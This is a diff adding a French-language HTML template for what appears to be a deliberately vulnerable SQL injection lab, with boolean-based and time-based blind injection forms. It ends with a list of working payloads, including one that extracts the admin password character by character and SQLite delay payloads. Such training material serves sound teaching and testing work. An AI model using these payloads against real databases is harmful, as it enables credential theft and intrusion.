@@ -1,0 +1,82 @@
+{% extends 'base.html' %}
+
+{% block title %}Blind SQL Injection{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>Blind SQL Injection - Boolean-based</h2>
+    <p>Verifier si un utilisateur existe (reponse Oui/Non uniquement)</p>
+
+    <form action="{{ prefix }}/blind" method="get" class="search-form">
+        <input type="text" name="username" value="{{ username }}" placeholder="Nom d'utilisateur a verifier...">
+        <button type="submit">Verifier</button>
+    </form>
+
+    {% if result is not none %}
+    <div class="alert {% if result %}alert-success{% else %}alert-danger{% endif %}">
+        {% if result %}
+        L'utilisateur existe dans la base de donnees
+        {% else %}
+        L'utilisateur n'existe pas
+        {% endif %}
+    </div>
+    {% endif %}
+
+    {% if query %}
+    <div class="query-display">
+        <strong>Requete executee:</strong><br>
+        {{ query }}
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>Blind SQL Injection - Time-based</h2>
+    <p>Recherche avec delai conditionnel (observer le temps de reponse)</p>
+
+    <form action="{{ prefix }}/blind-time" method="get" class="search-form">
+        <input type="text" name="id" value="{{ user_id }}" placeholder="ID utilisateur...">
+        <button type="submit">Rechercher</button>
+    </form>
+
+    {% if time_result is not none %}
+    <div class="alert alert-info">
+        Temps de reponse: <strong>{{ response_time }}</strong> secondes
+        {% if time_result %}
+        - Utilisateur trouve
+        {% else %}
+        - Utilisateur non trouve
+        {% endif %}
+    </div>
+    {% endif %}
+
+    {% if time_query %}
+    <div class="query-display">
+        <strong>Requete executee:</strong><br>
+        {{ time_query }}
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>Techniques d'injection Blind</h2>
+
+    <h3 style="margin-top: 1rem; color: #ffd93d;">Boolean-based</h3>
+    <ul style="list-style: none; padding: 0;">
+        <li style="margin-bottom: 0.5rem;"><code>admin' AND 1=1--</code> - Condition vraie (utilisateur existe)</li>
+        <li style="margin-bottom: 0.5rem;"><code>admin' AND 1=2--</code> - Condition fausse (utilisateur n'existe pas)</li>
+        <li style="margin-bottom: 0.5rem;"><code>admin' AND (SELECT COUNT(*) FROM users)>0--</code> - Verifier si table existe</li>
+        <li style="margin-bottom: 0.5rem;"><code>admin' AND SUBSTR((SELECT password FROM users WHERE name='admin'),1,1)='S'--</code> - Extraire caractere par caractere</li>
+    </ul>
+
+    <h3 style="margin-top: 1rem; color: #ffd93d;">Time-based</h3>
+    <ul style="list-style: none; padding: 0;">
+        <li style="margin-bottom: 0.5rem;"><code>1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)</code> - Delai si vrai</li>
+        <li style="margin-bottom: 0.5rem;"><code>1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN randomblob(100000000) ELSE 1 END)</code> - Delai si table existe</li>
+    </ul>
+</div>
+
+{% if error %}
+<div class="alert alert-danger">{{ error }}</div>
+{% endif %}
+{% endblock %}
